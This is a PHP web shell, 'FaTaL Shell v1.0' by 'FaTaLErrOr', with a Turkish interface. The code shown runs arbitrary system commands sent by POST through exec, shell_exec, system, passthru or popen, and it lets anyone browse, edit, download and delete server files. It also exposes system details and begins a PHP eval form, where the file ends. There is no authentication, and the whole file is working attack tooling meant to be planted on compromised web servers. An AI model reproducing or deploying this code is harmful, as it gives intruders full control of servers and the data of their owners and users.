<?php
session_start();
error_reporting(E_ALL ^ E_NOTICE);
set_magic_quotes_runtime(0);
@set_time_limit(0);
if(@get_magic_quotes_gpc()){foreach ($_POST as $k=>$v){$_POST[$k] = stripslashes($v);}}
@ini_set('max_execution_time',0);
(@ini_get('safe_mode')=="1" ? $safe_mode="ON" : $safe_mode="OFF(Rootla_Beni:)");

(@ini_get('disable_functions')!="" ? $disfunc=ini_get('disable_functions') : $disfunc=0);
(strtoupper(substr(PHP_OS, 0, 3))==='WIN' ? $os=1 : $os=0);
$version='version 1.0 by FaTaLErrOr';
$action=$_POST['action'];
$file=$_POST['file'];
$dir=$_POST['dir'];
$content='';
$stdata='';
$style='<STYLE>BODY{background-color: #2B2F34;color: #C1C1C7;font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;MARGIN-TOP: 0px;MARGIN-BOTTOM: 0px;MARGIN-LEFT: 0px;MARGIN-RIGHT: 0px;margin:0;padding:0;scrollbar-face-color: #336600;scrollbar-shadow-color: #333333;scrollbar-highlight-color: #333333;scrollbar-3dlight-color: #333333;scrollbar-darkshadow-color: #333333;scrollbar-track-color: #333333;scrollbar-arrow-color: #333333;}input{background-color: #336600;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}select{background-color: #336600;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}textarea{background-color: #333333;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}a:link{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:visited{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:hover, a:active{background-color: #A8A8AD;color: #E7E7EB;text-decoration: none;font-size: 8pt;}td, th, p, li{font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;border-color:black;}</style>';
$header='<html><head><title>'.getenv("HTTP_HOST").' - FaTaL Shell v1.0</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1254">'.$style.'</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';
$footer='</body></html>';

$lang=array(
'filext'=>'Lutfen Dosyayi Adlandiriniz Yada Degistiriniz.',
'uploadok'=>'Baþarýyla Yüklendi.',
'dircrt'=>'Klasör Oluþturuldu.',
'dontlist'=>'Listelenemiyor Ýzin Yok.',
'dircrterr'=>'Oluþturulamýyor Ýzin Yok.',
'dirnf'=>'Dizin Bulunamadi.',
'filenf'=>'.',
'dontwrdir'=>'Sadece Okunabilir.',
'empty'=>'Dizin Boþ Deðil Yada Ýzin Yok.',
'deletefileok'=>'Dosya Silindi.',
'deletedirok'=>'Klasör Silindi.',
'isdontfile'=>'Lütfen Full Url Yazýn. c:/program files/a.php Gibi',
'cantrfile'=>'Dosya Açýlamýyor izin Yok.',
'onlyracc'=>'Dosya Editlenemiyor Okuma Ýzni Var Sadece..',
'workdir'=>'Çalýþma Dizini: ',
'fullacc'=>'Full Yetki.',
'fullaccdir'=>'Full Yetkiniz Var Dosya Silip Düzenleyebilirsiniz.',
'thisnodir'=>'Klasör Seçin.',
'allfuncsh'=>'Fonksiyoýnlar Kapalý.'
);

$act=array('viewer','editor','upload','shell','phpeval','download','delete','deletedir');//here added new actions

function test_file($file){
if(!file_exists($file))$err="1";
elseif(!is_file($file)) $err="2";
elseif(!is_readable($file))$err="3";
elseif(!is_writable($file))$err="4"; else $err="5";
return $err;}

function test_dir($dir){
if(!file_exists($dir))$err="1";
elseif(!is_dir($dir)) $err="2";
elseif(!is_readable($dir))$err="3";
elseif(!is_writable($dir))$err="4"; else $err="5";
return $err;}

function perms($file){ 
  $perms = fileperms($file);
  if (($perms & 0xC000) == 0xC000) {$info = 's';} 
  elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} 
  elseif (($perms & 0x8000) == 0x8000) {$info = '-';} 
  elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} 
  elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} 
  elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} 
  elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} 
  else {$info = 'u';}
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ?(($perms & 0x0800) ? 's' : 'x' ) :(($perms & 0x0800) ? 'S' : '-'));
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ?(($perms & 0x0400) ? 's' : 'x' ) :(($perms & 0x0400) ? 'S' : '-'));
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ?(($perms & 0x0200) ? 't' : 'x' ) :(($perms & 0x0200) ? 'T' : '-'));
  return $info;} 

function view_size($size){
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;}

if(isset($action)){if(!in_array($action,$act))$action="viewer";else $action=$action;}else $action="viewer";

if(isset($dir)){
  $ts['test']=test_dir($dir); 
  switch($ts['test']){
    case 1:$stdata.=$lang['dirnf'];break;
    case 2:$stdata.=$lang['thisnodir'];break;
    case 3:$stdata.=$lang['dontlist'];break;
    case 4:$stdata.=$lang['dontwrdir'];$dir=chdir($GLOBALS['dir']);break;
    case 5:$stdata.=$lang['fullaccdir'];$dir=chdir($GLOBALS['dir']);break;}
}else $dir=@chdir($dir);

$dir=getcwd()."/";
$dir=str_replace("\\","/",$dir);

if(isset($file)){
    $ts['test1']=test_file($file);
  switch ($ts['test1']){
    case 1:$stdata.=$lang['filenf'];break;
	case 2:$stdata.=$lang['isdontfile'];break;
	case 3:$stdata.=$lang['cantrfile'];break;
	case 4:$stdata.=$lang['onlyracc'];$file=$file;break;
	case 5:$stdata.=$lang['fullacc'];$file=$file;break;}
}

function shell($cmd)
{
  global $lang;
 $ret = '';
 if (!empty($cmd))
 {
  if(function_exists('exec')){@exec($cmd,$ret);$ret = join("\n",$ret);}
  elseif(function_exists('shell_exec')){$ret = @shell_exec($cmd);}
  elseif(function_exists('system')){@ob_start();@system($cmd);$ret = @ob_get_contents();@ob_end_clean();}
  elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$ret = @ob_get_contents();@ob_end_clean();}
  elseif(@is_resource($f = @popen($cmd,"r"))){$ret = "";while(!@feof($f)) { $ret .= @fread($f,1024); }@pclose($f);}
  else $ret=$lang['allfuncsh'];
 }
 return $ret;
}

function createdir($dir){mkdir($dir);}

//delete file
if($action=="delete"){ 
if(unlink($file)) $content.=$lang['deletefileok']."<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$dir."'; document.reqs.submit();\"> AnaSayfaya Dönemk Ýçin Týklayýnýz.</a>";
}
//delete dir
if($action=="deletedir"){ 
if(!rmdir($file)) $content.=$lang['empty']."<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$dir."'; document.reqs.submit();\"> AnaSayfaya Dönemk Ýçin Týklayýnýz.</a>";
else $content.=$lang['deletedirok']."<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$dir."'; document.reqs.submit();\"> AnaSayfaya Dönemk Ýçin Týklayýnýz.</a>";
}
//shell
if($action=="shell"){
$content.="<form method=\"POST\">
<input type=\"hidden\" name=\"action\" value=\"shell\">
<textarea name=\"command\" rows=\"5\" cols=\"150\">".@$_POST['command']."</textarea><br>
<textarea readonly rows=\"15\" cols=\"150\">".convert_cyr_string(htmlspecialchars(shell($_POST['command'])),"d","w")."</textarea><br>
<input type=\"submit\" value=\"Uygula\"></form>";}
//editor  
if($action=="editor"){
  $stdata.="<form method=POST>
  <input type=\"hidden\" name=\"action\" value=\"editor\">
  <input type=\"hidden\" name=\"dir\" value=\"".$dir."\">
  Dosyanýn Adý (Full Url Yazýn)<input type=text name=file value=\"".($file=="" ? $file=$dir : $file=$file)."\" size=50><input type=submit value=\"Editle\"></form>";	  
  function writef($file,$data){
  $fp = fopen($file,"w+");
  fwrite($fp,$data);
  fclose($fp);
}
  function readf($file){
  clearstatcache();
  $f=fopen($file, "r");
  $contents = fread($f,filesize($file));
  fclose($f);
  return htmlspecialchars($contents);
}
if(@$_POST['save'])writef($file,$_POST['data']);
if(@$_POST['create'])writef($file,"");
$test=test_file($file);
if($test==1){
$content.="<form method=\"POST\">
<input type=\"hidden\" name=\"action\" value=\"editor\">
File name:<input type=\"text\" name=\"file\" value=\"".$file."\" size=\"50\"><br>
<input type=\"submit\" name=\"create\" value=\"Create new file with this name?\">
<input type=\"reset\" value=\"No\"></form>";
}
if($test>2){
$content.="<form method=\"POST\">
<input type=\"hidden\" name=\"action\" value=\"editor\">
<input type=\"hidden\" name=\"file\" value=\"".$file."\">
<textarea name=\"data\" rows=\"30\" cols=\"180\">".@readf($file)."</textarea><br>
<input type=\"submit\" name=\"save\" value=\"Kaydet\"><input type=\"reset\" value=\"Reset\"></form>";
}}
//viewer
if($action=="viewer"){
$content.="<table cellSpacing=0 border=1 style=\"border-color:black;\" cellPadding=0 width=\"100%\">";
$content.="<tr><td><form method=POST>Klasore Git:<input type=text name=dir value=\"".$dir."\" size=50><input type=submit value=\"Git\"></form></td></tr>";
  if (is_dir($dir)) {
    if (@$dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
		  if(filetype($dir . $file)=="dir") $dire[]=$file;
		  if(filetype($dir . $file)=="file")$files[]=$file;
		}
		closedir($dh);
		@sort($dire);
		@sort($files);
		if ($GLOBALS['os']==1) {
		  $content.="<tr><td>HDD Secin:";
		  for ($j=ord('C'); $j<=ord('Z'); $j++) 
		   if (@$dh = opendir(chr($j).":/"))
		   $content.='<a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.chr($j).':/\'; document.reqs.submit();"> '.chr($j).'<a/>';
		   $content.="</td></tr>";
		 }
		$content.="<tr><td>Sistem: ".@php_uname()."</td></tr><tr><td></td><td>Biçim</td><td>Boyut</td><td>izin</td><td>Seçenekler</td></tr>";
		for($i=0;$i<count($dire);$i++) {
		  $link=$dir.$dire[$i];
		  $content.='<tr><td><a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.$link.'\'; document.reqs.submit();">'.$dire[$i].'<a/></td><td>Klasor</td><td></td><td>'.perms($link).'</td><td><a href="#" onclick="document.reqs.action.value=\'deletedir\'; document.reqs.file.value=\''.$link.'\'; document.reqs.submit();" title="Klasörü Sil">X</a></td></tr>';  
		}
		for($i=0;$i<count($files);$i++) {
		  $linkfile=$dir.$files[$i];
		  $content.='<tr><td><a href="#" onclick="document.reqs.action.value=\'editor\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();">'.$files[$i].'</a><br></td><td>Dosya</td><td>'.view_size(filesize($linkfile)).'</td><td>'.perms($linkfile).'</td><td><a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Download">D</a><a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Edit">E</a><a href="#" onclick="document.reqs.action.value=\'delete\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Bu Dosyayi Sil">X</a></td></tr>'; 
		}
		$content.="</table>";
}}}
//downloader
if($action=="download"){ 
header('Content-Length:'.filesize($file).'');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="'.$file.'"');
readfile($file);}
//phpeval
if($action=="phpeval"){
$content.="<form method=\"POST\">
 <input type=\"hidden\" name=\"action\" value=\"phpeval\">
 <input type=\"hidden\" name=\"dir\" value=\"".$dir."\">
 &lt;?php<br>
 <textarea name=\"phpev\" rows=\"5\" cols=\"150\">".@$_POST['phpev']."</textarea><br>
 ?><?php echo $safe_mode;?><?php echo $disfunc;?><?php echo @php_uname();?><?php echo @$stdata;?>